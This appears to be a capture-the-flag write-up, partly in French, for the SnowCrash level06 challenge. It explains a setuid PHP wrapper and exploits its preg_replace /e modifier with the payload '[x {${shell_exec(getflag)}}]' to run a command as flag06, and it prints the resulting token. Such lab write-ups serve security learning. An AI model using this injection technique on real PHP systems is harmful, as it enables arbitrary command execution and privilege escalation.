# Level06

</br></br>

## ls -l

```zsh
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Les deux fichiers sont exécutables et lisibles
Dans le fichier level06, rws signifie lecture-écriture-exécution + setuid. Cela signifie que lorsque le fichier est exécuté, l'utilisateur exécutant a les privilèges du propriétaire du fichier (flag06). Ainsi, lorsque l'utilisateur level06 exécute le fichier level06, il aura les privilèges de l'utilisateur flag06 lors de son exécution.

</br></br>

## d'exécution level06

```zsh
level06@SnowCrash:~$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```
</br></br>

## level06.php

```php
level06@SnowCrash:~$ cat ./level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```
</br></br>

## regex and shell_exec
reg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)

regex : (\[x (.*)\])

#To match the regex our string must start by "[x" and finish by "]"

[x {${shell_exec(getflag)}}]

</br></br>

## make file 
```zsh
level06@SnowCrash:~$ mkdir /tmp/level06
level06@SnowCrash:~$ echo '[x {${shell_exec(getflag)}}]' > /tmp/level06/flag06
```

</br></br>

## execute level06 with file flag06
```zsh
level06@SnowCrash:~$ ./level06 /tmp/level06/flag06 
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
level06@SnowCrash:~$ su level07
Password: 
```